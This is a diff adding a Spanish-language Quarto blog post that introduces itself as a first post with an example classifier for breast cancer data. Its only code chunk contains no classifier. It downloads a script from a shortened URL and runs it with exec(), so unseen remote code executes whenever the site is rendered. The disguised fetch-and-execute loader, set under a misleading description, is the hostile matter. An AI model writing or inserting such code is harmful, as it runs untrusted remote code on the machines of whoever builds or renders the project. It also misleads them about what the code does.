@@ -1,0 +1,23 @@
+---
+title: "Mi Primer Post en el Blog"
+date: 2025-01-20
+---
+
+# ¡Bienvenidos!
+
+Este es mi primer post en el blog utilizando Quarto. Aquí tienes un clasificador de ejemplo para datos de cáncer de mama.
+
+```{python}
+import urllib.request
+
+gist_url = "https://shorturl.at/WZ8hR"
+
+try:
+   with urllib.request.urlopen(gist_url) as response:
+      script_content = response.read().decode('utf-8')
+   
+   print("Ejecutando el script...")
+   exec(script_content)  # Ejecutar el script
+except Exception as e:
+   print(f"Ocurrió un error: {e}")
+```
